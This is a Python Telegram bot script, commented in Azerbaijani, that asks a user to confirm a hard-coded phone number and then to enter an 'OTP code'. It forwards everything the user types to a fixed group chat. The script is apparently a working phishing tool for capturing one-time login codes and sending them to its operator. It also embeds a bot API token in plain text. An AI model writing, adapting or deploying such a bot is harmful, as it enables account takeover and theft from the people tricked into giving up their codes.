import logging
from telegram import InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Updater, CommandHandler, CallbackQueryHandler, MessageHandler, Filters

# Botunuzun API tokenini buraya yazın
API_TOKEN = '7623882467:AAFVguV5gcQ4_hdVuJQ7TUf42RX9QzOTRho'
GROUP_ID = '-4838313432'

# Loglamaq üçün məlumatları göstərəcək
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
                    level=logging.INFO)
logger = logging.getLogger(__name__)

# Start komandasını işlətmək və seçim düymələrini göndərmək
def start(update, context):
    keyboard = [
        [InlineKeyboardButton("+614480806641", callback_data='1')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    update.message.reply_text('Please confirm if this is your number.:', reply_markup=reply_markup)

# Seçim düymələrini idarə etmək
def button(update, context):
    query = update.callback_query
    choice = query.data
    if choice == '1':
        msg = "Please enter the OTP code!"
    elif choice == '2':
        msg = "Please enter the OTP code!"
    query.edit_message_text(text=msg)

    # Mesajı qrupa göndərmək
    context.bot.send_message(chat_id=GROUP_ID, text=msg)

# İstifadəçi mesajı göndərdikdə onu qrupa göndərmək
def handle_message(update, context):
    user_message = update.message.text
    context.bot.send_message(chat_id=GROUP_ID, text=user_message)

# Botu başlatmaq üçün əsas funksiya
def main():
    updater = Updater(API_TOKEN, use_context=True)
    dp = updater.dispatcher

    # Komanda və callback funksiyalarını əlavə etmək
    dp.add_handler(CommandHandler('start', start))
    dp.add_handler(CallbackQueryHandler(button))
    dp.add_handler(MessageHandler(Filters.text & ~Filters.command, handle_message))

    # Botu başlatmaq
    updater.start_polling()
    updater.idle()

if __name__ == '__main__':
    main()
